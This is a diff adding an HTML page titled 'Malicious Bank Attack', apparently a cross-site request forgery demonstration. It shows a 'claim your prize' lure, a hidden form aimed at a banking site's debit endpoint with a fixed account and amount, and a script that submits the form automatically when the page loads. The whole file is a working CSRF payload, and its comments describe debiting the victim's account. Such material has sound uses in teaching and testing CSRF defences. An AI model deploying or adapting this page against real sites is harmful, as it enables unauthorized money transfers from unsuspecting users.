@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious Bank Attack</title>
+  </head>
+  <body>
+    <h1>Special Offer</h1>
+    <p>Click here to claim your prize!</p>
+    <!-- Hidden form that sends a POST request to debit money from the victim's account -->
+    <form
+      id="csrfForm"
+      action="http://banking-app.com/debit"
+      method="POST"
+      style="display: none"
+    >
+      <input type="hidden" name="account_id" value="12345" />
+      <input type="hidden" name="amount" value="1000" />
+    </form>
+    <script>
+      // Automatically submit the form when the page loads
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
